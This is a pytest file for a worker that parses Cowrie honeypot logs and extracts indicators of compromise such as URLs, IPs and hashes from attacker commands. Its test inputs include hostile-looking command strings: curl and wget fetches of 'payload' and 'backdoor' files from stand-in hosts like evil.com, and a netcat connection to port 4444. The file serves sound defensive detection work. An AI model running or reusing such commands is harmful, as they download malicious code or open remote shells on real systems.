"""Tests for Cowrie worker with IOC integration"""
import pytest
from src.workers.cowrie_ingest import parse_cowrie_event, scan_for_iocs


class TestCowrieParsing:
    """Test Cowrie log parsing"""
    
    def test_parse_login_event(self):
        """Parse login event from Cowrie"""
        line = '{"src_ip": "10.0.0.1", "src_port": 54321, "login": "root"}'
        event = parse_cowrie_event(line)
        assert event.get("src_ip") == "10.0.0.1"
        assert event.get("login") == "root"
    
    def test_parse_command_event(self):
        """Parse command event from Cowrie"""
        line = '{"src_ip": "10.0.0.1", "command": "ls -la", "timestamp": "2024-01-01"}'
        event = parse_cowrie_event(line)
        assert event.get("command") == "ls -la"
    
    def test_parse_invalid_json(self):
        """Invalid JSON returns empty dict"""
        line = "not valid json"
        event = parse_cowrie_event(line)
        assert event == {}


class TestIOCInWorker:
    """Test IOC extraction in worker context"""
    
    def test_extract_url_from_command(self):
        """Extract URL from command"""
        iocs = scan_for_iocs("curl http://malware.example.com/payload")
        assert len(iocs["urls"]) == 1
        assert "malware.example.com" in iocs["urls"][0]
    
    def test_extract_hash_from_command(self):
        """Extract hash from command output"""
        iocs = scan_for_iocs("sha256sum file.exe -> abc123def4567890123456789012345678901234")
        assert len(iocs["hashes"]) == 1
    
    def test_extract_ip_from_command(self):
        """Extract IP from command"""
        iocs = scan_for_iocs("nc 192.168.1.100 4444")
        assert "192.168.1.100" in iocs["ips"]
    
    def test_extract_multiple_iocs(self):
        """Extract multiple IOC types from command"""
        cmd = "wget http://evil.com/backdoor -O /tmp/bd; sha256 abc123"
        iocs = scan_for_iocs(cmd)
        assert len(iocs["urls"]) == 1
        assert len(iocs["hashes"]) == 1
    
    def test_no_iocs_in_clean_command(self):
        """Clean command has no IOCs"""
        iocs = scan_for_iocs("ls -la /home")
        assert len(iocs["hashes"]) == 0
        assert len(iocs["urls"]) == 0


class TestWorkerIntegration:
    """Test worker integration points"""
    
    def test_session_id_format(self):
        """Test session ID format for correlation"""
        ip = "10.0.0.1"
        port = "54321"
        session_id = f"{ip}:{port}"
        assert session_id == "10.0.0.1:54321"
    
    def test_process_command_iocs(self):
        """Test IOC scanning integrates with command processing"""
        # This would be tested with the full worker in integration tests
        iocs = scan_for_iocs("curl http://1.2.3.4/payload")
        assert len(iocs["urls"]) + len(iocs["ips"]) > 0